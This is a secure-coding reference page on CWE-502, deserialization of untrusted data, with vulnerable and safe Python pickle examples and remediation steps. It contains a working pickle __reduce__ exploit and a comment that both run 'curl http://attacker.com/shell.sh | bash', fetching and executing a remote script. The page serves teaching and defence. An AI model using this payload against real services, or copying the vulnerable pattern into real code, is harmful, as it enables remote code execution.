# CWE-502: Deserialization of Untrusted Data

## Description

CWE-502 occurs when an application deserializes data from an untrusted source without
sufficient validation. Maliciously crafted serialized objects can trigger code execution
during deserialization, often before any application-level validation runs.

## Risk

- **CVSS Score**: Up to 9.8 (Critical)
- **Impact**: Remote Code Execution, Denial of Service, privilege escalation
- **OWASP**: A08:2021 — Software and Data Integrity Failures
- **Affected Languages**: Python (`pickle`), Java (native serialization), PHP (`unserialize`), Ruby (Marshal)

## Vulnerable Example (Python)

```python
# VULNERABLE: pickle.loads() with user-controlled data
import pickle
import base64

data = request.data  # attacker-controlled bytes
obj = pickle.loads(data)

# A crafted pickle payload can execute:
# os.system("curl attacker.com | bash")
# during deserialization — before any code in the app runs
```

## Crafted Attack Payload

```python
import pickle, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ("curl http://attacker.com/shell.sh | bash",))

payload = pickle.dumps(Exploit())
# Sending this payload to pickle.loads() executes the command
```

## Safe Example (Python)

```python
# SAFE: use JSON for data exchange instead of pickle
import json

data = request.get_json()  # parses JSON, cannot execute code

# SAFE: if pickle is unavoidable, use HMAC signing to verify integrity
import hmac, hashlib, pickle

SECRET = os.environ["PICKLE_SECRET"]

def safe_loads(data: bytes, signature: bytes) -> object:
    expected = hmac.new(SECRET.encode(), data, hashlib.sha256).digest()
    if not hmac.compare_digest(expected, signature):
        raise ValueError("Invalid signature — data may be tampered")
    return pickle.loads(data)
```

## Remediation

1. **Never deserialize pickle, marshal, or Java serialization data from untrusted sources.**
2. Use safe, language-neutral formats: JSON, MessagePack, or Protocol Buffers.
3. If pickle is required, verify data integrity with HMAC before deserialization.
4. Run deserialization in an isolated process or container with no network access.
5. Keep deserialization libraries updated to patch known gadget chains.
